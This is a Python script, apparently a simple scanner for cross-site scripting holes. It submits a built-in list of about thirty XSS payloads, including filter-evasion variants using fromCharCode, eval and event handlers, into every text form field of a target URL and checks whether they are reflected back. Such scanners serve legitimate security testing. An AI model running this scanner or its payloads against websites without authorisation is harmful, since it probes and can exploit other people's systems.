#!/bin/python3


import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import sys

printres = {} #For Storing O/P
xss_url = []
xss_method = []

def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details_xss(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form_xss(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        res =  requests.post(target_url, data=data)
        xss_url.append(res.url)
        xss_method.append("POST")
        return res
    else:
        res = requests.get(target_url, params=data)
        xss_url.append(res.url)
        xss_method.append("GET")
        return res

def scan_xss(url):
    is_vulnerable = False
    forms = get_all_forms(url)
    #print("\n[+] Scanning for XSS in",url)
    xss_forms = []
    payloads = [ "<script>alert('XSS')</script>", "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        '"><script>alert(1)</script>', '"><script>alert(String.fromCharCode(88,83,83))</script>',"<img src=x onerror=alert('XSS');>","<img src=x onerror=alert('XSS')//",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83));>", '<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>',
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",'"><img src=x onerror=alert(1);>','"><img src=x onerror=alert(String.fromCharCode(88,83,83));>',
        "<svg onload=alert(1)>", "<svg/onload=alert('XSS')>",
        "<svg onload=alert(1)//", "<svg/onload=alert(String.fromCharCode(88,83,83))>","<svg id=alert(1) onload=eval(id)>",
        '"><svg/onload=alert(String.fromCharCode(88,83,83))>','"><svg/onload=alert(/XSS/)',"<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
        '<div onpointerover="alert(45)">MOVE HERE</div>','<div onpointerdown="alert(45)">MOVE HERE</div>',
        '<div onpointerenter="alert(45)">MOVE HERE</div>','<div onpointerleave="alert(45)">MOVE HERE</div>','<div onpointermove="alert(45)">MOVE HERE</div>',
        '<div onpointerout="alert(45)">MOVE HERE</div>','<div onpointerup="alert(45)">MOVE HERE</div>',
        "/<svg onload=alert(1)","/<script>alert('XSS');//","/<input autofocus onfocus=alert(1)>"                
    ]
    for form in forms:
        form_details = get_form_details_xss(form)
        for script in payloads:
            content = submit_form_xss(form_details, url, script).content.decode()
            if script in content:
                xss_forms.append(form)
                #print(xss_forms)
                printres.update(XSS = 'Is Vulnerable')
                is_vulnerable = True
                return printres

    #print(xss_payloads)
    #print(xss_forms)
    if not is_vulnerable:
        printres.update(XSS = 'Not Vulnerable')
        return printres

if __name__ == "__main__":
    #url = sys.stdin.read()
    #url = input()
    url = str(sys.argv[1])
    printres=scan_xss(url)
    #print(xss_method)
    try:
        print(printres['XSS'],xss_method[0]+":"+xss_url[0])
    except:
        print(printres['XSS'],":"+url)
